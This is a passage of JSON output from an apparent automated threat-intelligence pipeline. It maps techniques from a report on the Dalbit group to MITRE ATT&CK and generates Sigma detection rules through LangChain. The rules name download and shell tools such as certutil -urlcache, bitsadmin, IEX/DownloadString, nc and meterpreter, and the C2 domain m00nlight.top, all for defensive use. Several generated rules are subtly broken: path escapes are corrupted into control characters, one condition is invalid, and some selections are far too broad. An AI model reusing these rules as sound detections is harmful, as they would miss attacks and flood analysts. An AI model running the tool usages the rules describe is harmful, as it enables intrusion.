        "ttp_id": "ac513977-d418-419d-bb4f-55ac6a87c6b2",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Remote Services",
        "attack_id": "T1021",
        "tactic": "Lateral Movement",
        "description": "Detected Remote Services activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "10a8fc2e-31e1-4bcb-a7a6-d6593374b7b2",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Screen Capture",
        "attack_id": "T1113",
        "tactic": "Collection",
        "description": "Detected Screen Capture activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "e565872e-ff6d-419a-98cc-7fcb18ec076a",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Registry Run Keys",
        "attack_id": "T1547.001",
        "tactic": "Persistence",
        "description": "Detected Registry Run Keys activity via NLP pattern matching",
        "confidence_score": 0.623,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "0068cf68-42e9-4fb5-8d2f-94a62c3ca1eb",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Remote Desktop Protocol",
        "attack_id": "T1021.001",
        "tactic": "Lateral Movement",
        "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
        "confidence_score": 0.623,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "2363783e-2739-4f08-94b6-e5663298de11",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Phishing",
        "attack_id": "T1566",
        "tactic": "Initial Access",
        "description": "Detected Phishing activity via NLP pattern matching",
        "confidence_score": 0.621,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 31,
      "rules_generated": 31,
      "langchain_generations": 147,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 30091.432
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "status": "success",
        "rule": {
          "title": "Proxy Tool Execution Using FRP, LCX or Socks5 Protocol",
          "description": "Detects the execution of known proxy tools such as FRP and LCX, or processes using the Socks5 protocol, which can be indicative of command and control (C2) activity. This rule focuses on process creation events with command-line indicators associated with proxy tools.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_frp": {
              "Image|endswith": [
                "\\frp.exe",
                "\\frpc.exe",
                "\\frps.exe"
              ],
              "CommandLine|contains": [
                "server_addr",
                "token",
                "local_port",
                "remote_port",
                "socks5"
              ]
            },
            "selection_lcx": {
              "Image|endswith": [
                "\\lcx.exe"
              ],
              "CommandLine|contains": [
                "-tran",
                "-listen",
                "-slave",
                "-listen",
                "socks"
              ]
            },
            "selection_socks5_in_cmd": {
              "CommandLine|contains": [
                "socks5",
                "-proxy",
                "--proxy",
                "proxy",
                "m00nlight.top"
              ]
            },
            "condition": "selection_frp or selection_lcx or (selection_socks5_in_cmd and not Image|endswith|in ['\\chrome.exe', '\\msedge.exe', '\\firefox.exe', '\\iexplore.exe'])"
          },
          "falsepositives": [
            "Legitimate use of FRP in development or devops environments for reverse proxying",
            "Internal network tunneling tools used by system administrators",
            "Applications that legitimately configure SOCKS5 proxies (e.g., some chat, VoIP, or P2P software)"
          ],
          "level": "high",
          "tags": [
            "attack.t1090",
            "attack.c2",
            "custom.proxy",
            "custom.frp",
            "custom.lcx",
            "custom.socks5",
            "m00nlight.top"
          ],
          "ttp_id": "unknown",
          "technique_name": "Proxy",
          "generation_method": "langchain",
          "id": "801637e7-544f-49c3-b142-757d70c7bae0"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "status": "success",
        "rule": {
          "title": "Command and Control via Proxy Server m00nlight.top",
          "description": "Detects command and control activity using the proxy server m00nlight.top as a relay for malicious communications. This rule identifies process creation events involving known suspicious command-line utilities making network connections to the proxy domain.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_domain": {
              "CommandLine|contains": "m00nlight.top"
            },
            "selection_tools": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\curl.exe",
                "\\wget.exe",
                "\\certutil.exe",
                "\\bitsadmin.exe"
              ]
            },
            "condition": "selection_domain and selection_tools"
          },
          "falsepositives": [
            "Legitimate administrative use of command-line tools to access external resources (rare for this specific domain)",
            "Automated scripts or monitoring tools accessing the domain (if domain is used for benign purposes, though currently associated with malicious activity)"
          ],
          "level": "high",
          "tags": [
            "attack.t1090",
            "attack.c2",
            "custom.proxy",
            "m00nlight.top"
          ],
          "ttp_id": "unknown",
          "technique_name": "Proxy",
          "generation_method": "langchain",
          "id": "875e7826-72a4-4f00-bf6d-2b0d61fe38fd"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Fast Reverse Proxy",
        "status": "success",
        "rule": {
          "title": "Fast Reverse Proxy (FRP) Tool Execution",
          "description": "Detects execution of Fast Reverse Proxy (FRP), a tool used by threat actors for command and control, particularly in attacks targeting Korean companies. This rule identifies suspicious process creation patterns associated with FRP usage.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_frp_process": {
              "Image|endswith": [
                "\\frpc.exe",
                "\\frps.exe"
              ]
            },
            "selection_frp_command_args": {
              "CommandLine|contains": [
                "-c",
                "-f",
                "--server_addr",
                "--token",
                "[common]",
                "[proxy]",
                "type=",
                "local_ip=",
                "local_port="
              ]
            },
            "selection_frp_network_call": {
              "CommandLine|contains": [
                "http",
                "https",
                "tcp",
                "udp",
                "stcp",
                "xtcp"
              ]
            },
            "condition": "selection_frp_process and (selection_frp_command_args or selection_frp_network_call)"
          },
          "falsepositives": [
            "Legitimate use of FRP in development or internal tunneling scenarios by authorized personnel",
            "Use of FRP in lab or testing environments for reverse proxy testing"
          ],
          "level": "high",
          "tags": [
            "attack.t1102",
            "attack.t1090",
            "attack.g0007",
            "threat.apt",
            "tool.frp"
          ],
          "ttp_id": "unknown",
          "technique_name": "Fast Reverse Proxy",
          "generation_method": "langchain",
          "id": "e8ba782e-52af-48a2-9041-7722ff3b0b52"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter Abuse via Common Tools",
          "description": "Detects the use of command-line interpreters and scripting tools such as cmd.exe, certutil, bitsadmin, and at for executing commands, which is commonly associated with adversary command and control or lateral movement activities.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "&",
                "^",
                "|",
                "<",
                ">",
                "start",
                "echo"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache",
                "-f"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "/create",
                "http",
                "https"
              ]
            },
            "selection_at": {
              "Image|endswith": "\\at.exe",
              "CommandLine|contains": [
                "\\\\",
                "cmd",
                "exe"
              ]
            },
            "condition": "selection_cmd or selection_certutil or selection_bitsadmin or selection_at"
          },
          "falsepositives": [
            "Legitimate administrative use of certutil, bitsadmin, or at by system administrators",
            "Automated scripts or scheduled tasks using cmd.exe with complex command lines",
            "Software deployment tools leveraging bitsadmin or certutil for file transfer or decoding"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.T1059",
            "custom.detection-rule",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "6005777b-4036-4ba2-9ab3-48b3d38538b0"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter Activity by Dalbit Group",
          "description": "Detects command and scripting interpreter activity associated with the Dalbit group using tools such as At, Bitsadmin, CMD, Certutil, and MetaSploit for execution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_at": {
              "Image|endswith": "\\at.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache",
                "-verifyctl"
              ]
            },
            "selection_metasploit": {
              "CommandLine|contains": [
                "meterpreter",
                "exploit",
                "msf",
                "msfvenom"
              ]
            },
            "condition": "selection_at or selection_bitsadmin or selection_cmd or selection_certutil or selection_metasploit"
          },
          "falsepositives": [
            "Scheduled task creation using 'at.exe' by system administrators",
            "Legitimate use of 'bitsadmin.exe' for background file transfers",
            "Normal command-line usage via cmd.exe in administrative scripts",
            "Use of certutil.exe for certificate management by IT staff",
            "Metasploit framework usage in penetration testing environments"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.T1059",
            "threat-group.dalbit"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "b2a8415c-6a89-48a1-8eed-804b83071778"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Backdoor",
        "status": "success",
        "rule": {
          "title": "Detected Malware Backdoor via Suspicious Process Creation",
          "description": "Detects the presence of a backdoor by identifying suspicious process creation patterns commonly associated with APT activity and backdoor execution on Windows systems. Focuses on command-line characteristics and execution of suspicious binaries.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_suspicious_image": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ],
              "CommandLine|contains": [
                "\\\\",
                "http",
                "https",
                "base64",
                "-enc",
                "/c",
                "cmd /k",
                "iex",
                "Invoke-Expression",
                "DownloadString",
                "WebClient",
                "Start-Process",
                "New-Object",
                "Shell.Application",
                "Run",
                "Execute",
                "CreateObject",
                "WScript.Shell"
              ]
            },
            "selection_suspicious_parent": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\\winlogon.exe",
                "\\svchost.exe",
                "\\services.exe",
                "\\lsass.exe"
              ],
              "ParentCommandLine|contains": [
                "/",
                "-",
                "\\",
                "http",
                "iex",
                "cmd /k"
              ]
            },
            "selection_known_indicators": {
              "CommandLine|contains": [
                "Backdoor"
              ]
            },
            "condition": "selection_suspicious_image or selection_suspicious_parent or selection_known_indicators"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell or command-line tools",
            "Scheduled tasks executing scripts via rundll32 or mshta",
            "Software deployment tools using command-line utilities",
            "User-initiated script execution from explorer"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.t1059",
            "attack.t1204",
            "attack.t1543",
            "attack.t1013",
            "malware.backdoor",
            "custom.apt"
          ],
          "ttp_id": "unknown",
          "technique_name": "Backdoor",
          "generation_method": "langchain",
          "id": "1f4109c7-5058-49a3-8bc2-039e9714c780"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "status": "success",
        "rule": {
          "title": "Exploitation for Client Execution via Korean Groupware Solution",
          "description": "Detects potential exploitation of a vulnerability in a Korean groupware solution for client-side execution. This rule focuses on suspicious process creation patterns that may indicate exploitation leading to arbitrary code execution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_groupware_process": {
              "Image|contains": [
                "groupware",
                "GroupWare",
                "GROUPWARE"
              ]
            },
            "selection_suspicious_child": {
              "ParentImage|contains": [
                "groupware",
                "GroupWare",
                "GROUPWARE"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ]
            },
            "selection_command_line_indicators": {
              "ParentImage|contains": [
                "groupware",
                "GroupWare",
                "GROUPWARE"
              ],
              "CommandLine|contains": [
                "\\\\",
                "http",
                "https",
                "base64",
                "-enc",
                "/c",
                "cmd /k",
                "powershell -",
                "wscript",
                "cscript"
              ]
            },
            "condition": "selection_groupware_process or (selection_suspicious_child and selection_command_line_indicators)"
          },
          "falsepositives": [
            "Legitimate administrative scripts launched from within groupware applications",
            "Automated workflows or integrations using command-line tools via groupware",
            "Software updates or patch installations initiated through groupware"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.T1203",
            "detection-rule.sigma",
            "custom.windows",
            "custom.groupware",
            "custom.korean-software"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation for Client Execution",
          "generation_method": "langchain",
          "id": "0be85fc8-fbb9-4130-8f57-044da7a8e83c"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Server Software Vulnerability",
        "status": "success",
        "rule": {
          "title": "Server Software Vulnerability Exploitation Attempt",
          "description": "Detects potential exploitation of server software vulnerabilities by identifying suspicious process creation patterns often associated with exploitation activities, such as command shell execution from server processes or known exploitation tools.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_server_process": {
              "ParentImage|endswith": [
                "\\httpd.exe",
                "\nginx.exe",
                "\\w3wp.exe",
                "\tomcat.exe",
                "\\java.exe"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\certutil.exe",
                "\bitsadmin.exe",
                "\\msiexec.exe"
              ]
            },
            "selection_suspicious_cli": {
              "CommandLine|contains": [
                "-enc",
                "Invoke-WebRequest",
                "http://",
                "https://",
                "/c",
                "start",
                "echo",
                ">",
                ">>",
                "nc",
                "ncat",
                "telnet",
                "wget",
                "curl"
              ]
            },
            "condition": "selection_server_process and selection_suspicious_cli"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed from web server contexts",
            "Automated deployment tools running under server processes",
            "Scheduled tasks initiated by application pools for maintenance"
          ],
          "level": "high",
          "tags": [
            "attack.t1190",
            "attack.execution",
            "attack.privilege_escalation",
            "attack.lateral_movement",
            "detection.emulation_tested"
          ],
          "ttp_id": "unknown",
          "technique_name": "Server Software Vulnerability",
          "generation_method": "langchain",
          "id": "dd2ea64d-3167-4009-aebf-f0f6ff8c1d06"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tools",
        "status": "success",
        "rule": {
          "title": "Remote Access Tool Configuration via FRP INI File",
          "description": "Detects the use of FRP (Fast Reverse Proxy) configuration files (.ini) which may indicate the deployment of remote access tools by threat actors such as the Dalbit group for command and control purposes.",
          "logsource": {
            "category": "file_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_frp_ini": {
              "TargetFilename|endswith": ".ini",
              "CommandLine|contains": [
                "frp",
                "frpc",
                "frps"
              ]
            },
            "selection_process_write": {
              "Image|endswith": [
                "\frpc.exe",
                "\frps.exe"
              ]
            },
            "condition": "selection_frp_ini or selection_process_write"
          },
          "falsepositives": [
            "Legitimate use of FRP by system administrators or developers for remote access or port forwarding",
            "Development or testing environments where FRP is used for tunneling services"
          ],
          "level": "high",
          "tags": [
            "attack.t1210",
            "attack.command-and-control",
            "custom.frp",
            "custom.remote-access",
            "custom.dalbit"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Access Tools",
          "generation_method": "langchain",
          "id": "422a931a-f258-4f1c-904d-96cd0d801d18"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Downloader",
        "status": "success",
        "rule": {
          "title": "Detected Malware Downloader via Command Line Tool",
          "description": "Detects the use of command line tools commonly associated with downloader malware activity by analyzing process creation events for suspicious command line patterns and child processes.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc",
                "Out-File",
                "System.Net.WebClient",
                "IEX",
                "DownloadString",
                "DownloadFile"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache",
                "-f"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http"
              ]
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": [
                "http",
                "-o"
              ]
            },
            "selection_wget": {
              "Image|endswith": "\\wget.exe",
              "CommandLine|contains": [
                "http",
                "-O"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_curl or selection_wget"
          },
          "falsepositives": [
            "Legitimate administrative scripts using command line tools for file download or automation",
            "Software deployment tools utilizing bitsadmin or certutil for updates",
            "PowerShell scripts used in configuration management (e.g., Ansible, Chef)"
          ],
          "level": "high",
          "tags": [
            "attack.initial-access",
            "attack.t1105",
            "malware.downloader",
            "custom.sigma-rule"
          ],
          "ttp_id": "unknown",
          "technique_name": "Downloader",
          "generation_method": "langchain",
          "id": "afc27d9a-59ec-4ad5-949a-bcc1abe5b78f"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Create or Modify System Process via Command Line Tools",
          "description": "Detects creation or modification of system processes using command-line utilities commonly associated with persistence activities. This rule identifies suspicious process creation patterns involving tools like sc.exe, powershell.exe, and wmic.exe that may indicate adversary attempts to establish persistence through system-level services or processes.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_sc_create": {
              "Image|endswith": "\\sc.exe",
              "CommandLine|contains": "create"
            },
            "selection_sc_config": {
              "Image|endswith": "\\sc.exe",
              "CommandLine|contains": "config"
            },
            "selection_powershell_service": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "New-Service",
                "Set-Service",
                "-Exec",
                "-PathName"
              ]
            },
            "selection_wmic_service": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "service",
                "create",
                "config"
              ]
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": [
                "create",
                "/RU SYSTEM",
                "/RL HIGHEST"
              ]
            },
            "condition": "selection_sc_create or selection_sc_config or selection_powershell_service or selection_wmic_service or selection_schtasks"
          },
          "falsepositives": [
            "Legitimate system administration activities using sc.exe, wmic.exe, or PowerShell to manage Windows services",
            "Scheduled task creation by IT management tools",
            "Automated patch management systems modifying service configurations"
          ],
          "level": "high",
          "tags": [
            "attack.t1053",
            "attack.t1543",
            "attack.t1126",
            "attack.t1037",
            "attack.g0004",
            "detection.rule.quality.high",
            "use-case.persistence"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "id": "90e8f8e4-5d00-4e96-9de4-2364efc8729a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter - CMD Execution",
          "description": "Detects execution of cmd.exe as part of command and scripting interpreter technique for execution",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\cmd.exe"
            },
            "selection_command_line_args": {
              "CommandLine|contains": [
                "/c",
                "/k",
                ">",
                ">>",
                "|",
                "&",
                "^",
                "\"\"",
                "start",
                "echo"
              ]
            },
            "condition": "selection and selection_command_line_args"
          },
          "falsepositives": [
            "Legitimate administrative use of cmd.exe via scripts or manual execution",
            "Scheduled tasks invoking cmd.exe for system maintenance",
            "Software installation routines that use command-line interfaces"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.T1059",
            "custom.sigma",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "ba01febb-e92b-4942-8884-c6c3da33a2b7"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Utilities",
        "status": "success",
        "rule": {
          "title": "Detected Use of Bitsadmin for Execution",
          "description": "Detects the execution of bitsadmin.exe which can be used by adversaries to download files, execute programs, or perform other malicious activities as part of execution tactics.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "bitsadmin"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative use of bitsadmin.exe for background file transfers",
            "Automated scripts or scheduled tasks using bitsadmin for software updates"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1197",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Utilities",
          "generation_method": "langchain",
          "id": "d8be6cb7-8e22-47ea-8bdf-b248674a24fd"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Utilities",
        "status": "success",
        "rule": {
          "title": "Detected Use of Certutil for Execution",
          "description": "Detects the use of certutil.exe, a Windows system utility, which can be abused for malicious purposes such as downloading files, decoding data, or bypassing defenses. This rule identifies process creation events involving certutil.exe with common command-line arguments indicative of abuse.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-urlcache",
                "-verifyctl",
                "-addstore",
                "-decode",
                "-decodehex",
                "-encode",
                "-split",
                "-retrieve",
                "-f"
              ]
            },
            "condition": "selection_certutil"
          },
          "falsepositives": [
            "Legitimate administrative use of certutil.exe for certificate management, troubleshooting, or software deployment",
            "Automated patch management or monitoring tools that use certutil in scripts"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1105",
            "attack.t1218",
            "attack.t1555.004",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Utilities",
          "generation_method": "langchain",
          "id": "2198544a-0942-4b97-b993-07ee86cc6007"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task",
        "status": "success",
        "rule": {
          "title": "Scheduled Task Creation or Execution via at.exe",
          "description": "Detects the use of at.exe for scheduling or executing tasks, which is commonly abused by adversaries for execution and persistence. This technique is associated with MITRE ATT&CK T1053.002 (Scheduled Task/Job: at).",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\at.exe"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative use of at.exe in legacy environments",
            "Scheduled task management via automated scripts in controlled scenarios"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1053.002",
            "custom.windows",
            "custom.suspicious-tool-use"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scheduled Task",
          "generation_method": "langchain",
          "id": "20a883b3-e877-4a3d-b607-304f7afd4327"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "status": "success",
        "rule": {
          "title": "Exploitation for Client Execution via MetaSploit",
          "description": "Detects the use of MetaSploit as observed in exploitation activities for client execution. This rule focuses on behavioral indicators associated with MetaSploit payloads and execution patterns.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_metasploit_process": {
              "Image|endswith": [
                "\rundll32.exe",
                "\\mshta.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ],
              "CommandLine|contains": [
                "msf",
                "meterpreter",
                "exploit",
                "payload"
              ]
            },
            "selection_metasploit_parent": {
              "ParentImage|endswith": [
                "\\msfconsole",
                "\\msfvenom"
              ],
              "Image|endswith": [
                "\rundll32.exe",
                "\\mshta.exe",
                "\\powershell.exe",
                "\\cmd.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ]
            },
            "condition": "selection_metasploit_process or selection_metasploit_parent"
          },
          "falsepositives": [
            "Legitimate penetration testing activities using MetaSploit framework",
            "Security tools or scripts that include 'msf', 'meterpreter', 'exploit', or 'payload' in command lines for documentation or testing purposes"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.T1203",
            "attack.T1106",
            "attack.T1059",
            "threat-actor.metasploit"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation for Client Execution",
          "generation_method": "langchain",
          "id": "ef8b9b42-52aa-468c-a4cb-58f2cb722ded"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Application Layer Protocol Activity via NLP Pattern Matching",
          "description": "Detects Application Layer Protocol activity by identifying suspicious command-line patterns indicative of data exfiltration or command and control using common tools.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
